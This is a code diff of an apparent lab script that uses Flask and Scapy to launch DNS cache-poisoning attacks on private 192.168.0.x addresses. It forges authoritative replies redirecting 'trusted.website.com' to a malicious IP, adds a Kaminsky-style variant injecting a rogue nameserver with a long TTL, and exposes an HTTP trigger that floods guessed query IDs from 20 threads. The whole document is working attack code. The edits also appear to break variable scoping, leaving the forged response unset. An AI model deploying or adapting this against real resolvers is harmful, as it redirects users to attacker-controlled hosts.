@@ -3,24 +3,32 @@ from flask import Flask, request
 import threading
 
 app = Flask(__name__)
-src_ip = "192.168.0.100"
-dst_ip = "192.168.0.200"
+src_ip_dns = 	"192.168.0.10"
+src_ip = 	"192.168.0.100"
+mal_ip_dns = 	"192.168.0.150"
+mal_ip = 	"192.168.0.151"
+dst_ip = 	"192.168.0.200"
 
 src_port = 53
 dst_port = 6666
 
-website = "trusted.website.com"
-mal_ip = "192.168.0.151"
-dnswebsite ="dnswebsite.website.com"
+website = 	"trusted.website.com"
+dnswebsite =	"dnswebsite.website.com"
+ttl = 600000
+
+
 # precompute standard object
-response = (IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1,
-            aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=604769, rdata=mal_ip)))
+response_c = (IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1,
+            aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=ttl, rdata=mal_ip)))
 
 # kaminsky
-# response=(IP(dst=src_ip, src=dst_ip)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=604769, rdata=dnswebsite), ar=DNSRR(rrname=dnswebsite, type='A', ttl=604769, rdata="192.168.0.150")))
+response_k = (IP(dst=dst_ip, src=src_ip_dns)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1, 
+		aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=ttl, rdata=dnswebsite), 
+		ar=DNSRR(rrname=dnswebsite, type='A', ttl=ttl, rdata=mal_ip_dns)))
 
-# list of messages
-dns_layer = response[DNS]
+# dynamic var
+dns_layer = None
+response  = None
 
 s = conf.L3socket()
 
@@ -33,6 +41,15 @@ def attack(start):
 
 @app.route('/', methods=['GET'])
 def start_attack():
+	
+	if request.args.get('attack') == 'k':
+		dns_layer = response_k[DNS]
+		response  = response_k
+	else:
+		dns_layer = response_c[DNS]
+		response  = response_c
+	
+	
 	qid = int(request.args.get('start_qid'))
 	for i in range(0, 20, 1):
 		threading.Thread(target=attack, args=(qid,)).start()
@@ -40,6 +57,5 @@ def start_attack():
 
 
 if __name__ == "__main__":
-	mp.set_start_method('spawn')
 	app.run(debug = True, host = '0.0.0.0', port = 8888)
 
